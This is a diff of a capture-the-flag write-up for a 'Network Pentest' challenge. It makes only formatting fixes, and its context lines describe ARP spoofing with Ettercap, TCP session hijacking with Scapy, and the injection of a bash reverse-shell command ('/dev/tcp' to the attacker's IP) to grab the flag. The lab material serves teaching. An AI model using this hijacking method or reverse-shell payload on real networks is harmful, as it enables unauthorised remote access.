@@ -31,7 +31,7 @@ MAC Address: 02:42:1D:65:54:70 (Unknown)
 
 172.30.0.8, on the other hand, had no open ports.
 
-This is weird, the category was "Network Pentest"! Anyway, I theorized that perhaps 1337 was indeed open, but the firewall blocks anyone other than 172.30.0.8 from accessing the service? 
+This is weird, the category was "Network Pentest"! Anyway, I theorized that perhaps 1337 was indeed open, but the firewall blocks anyone other than 172.30.0.8 from accessing the service?&#x20;
 
 ### Man-in-the-Middle
 
@@ -58,15 +58,15 @@ Okay, now we understand what is happening.
 
 ### Hijacking the Session
 
-Essentially, we need to intercept the TCP connection, and spoof a response containing our custom command to the server. This is called** TCP session hijacking**, which builds on top of a MITM attack. The idea is that we have to calculate the correct SEQ and ACK numbers, in order to spoof a packet as the client.
+Essentially, we need to intercept the TCP connection, and spoof a response containing our custom command to the server. This is called **TCP session hijacking**, which builds on top of a MITM attack. The idea is that we have to calculate the correct SEQ and ACK numbers, in order to spoof a packet as the client.
 
-In a TCP connection, if invalid SEQ numbers are received, the receiver simply discards the packets. Initial sequence numbers (ISNs) are thus randomised, preventing SEQ numbers from being predicted. Arbitrarily injected packets by an attacker "guessing" the SEQ number would therefore be likely to have invalid SEQ numbers.** **
+In a TCP connection, if invalid SEQ numbers are received, the receiver simply discards the packets. Initial sequence numbers (ISNs) are thus randomised, preventing SEQ numbers from being predicted. Arbitrarily injected packets by an attacker "guessing" the SEQ number would therefore be likely to have invalid SEQ numbers. ****&#x20;
 
 However, if an attacker is able to achieve a man-in-the-middle attack, it would be trivial to obtain the relevant SEQ numbers of TCP packets transmitted between two nodes.
 
-![](https://lh5.googleusercontent.com/22lSaL0ogOMcs18PYt33A84ORcf7JXfuyD_ZYwTBAw5y5u_vyCwNDpZQfxKgP63YvD9-X2\_bZSC\_1EQxnu1AP0IhYPXIsD-d_YY5go8SPTZDiZGGo4R53qMm6KMmHjZVwn1H68Nr)
+![](https://lh5.googleusercontent.com/22lSaL0ogOMcs18PYt33A84ORcf7JXfuyD\_ZYwTBAw5y5u\_vyCwNDpZQfxKgP63YvD9-X2\_bZSC\_1EQxnu1AP0IhYPXIsD-d\_YY5go8SPTZDiZGGo4R53qMm6KMmHjZVwn1H68Nr)
 
-The following script implements this (this script is run _after_ first establishing a MITM using Ettercap - we could also use Scapy to implement the MITM, but it gets really messy and Scapy faces its own limitations too). 
+The following script implements this (this script is run _after_ first establishing a MITM using Ettercap - we could also use Scapy to implement the MITM, but it gets really messy and Scapy faces its own limitations too).&#x20;
 
 ```python
 from scapy.all import *
@@ -181,7 +181,7 @@ The syntax for running Ettercap with the filter is:
 
 Now, we can run the Python script and specify our desired command. Our command is `bash -c "bash -i >& /dev/tcp/172.30.0.14/1337 0>&1"`, which sends a reverse shell from the server to us.
 
-![](../../.gitbook/assets/upload_c478bfc59bf91c2651693ff0c0c0745e.png)
+![](../../.gitbook/assets/upload\_c478bfc59bf91c2651693ff0c0c0745e.png)
 
 The next time that a shell is sent to the client, our script will intercept the traffic and send the reverse shell payload to the server, allowing us to catch a shell, and obtain the flag.
 
@@ -193,6 +193,6 @@ _And that, everyone, is why we use SSH instead of Telnet._
 
 ### On Hindsight...
 
-There was an easier way to solve this. After performing the ARP spoofing attack using Ettercap, we could have just forged the base 64 encoded request, specifying the IP address and port of our choice to receive the shell (no scripting required?). 
+There was an easier way to solve this. After performing the ARP spoofing attack using Ettercap, we could have just forged the base 64 encoded request, specifying the IP address and port of our choice to receive the shell (no scripting required?).&#x20;
 
 But hey, this was more fun, and probably more realistic!
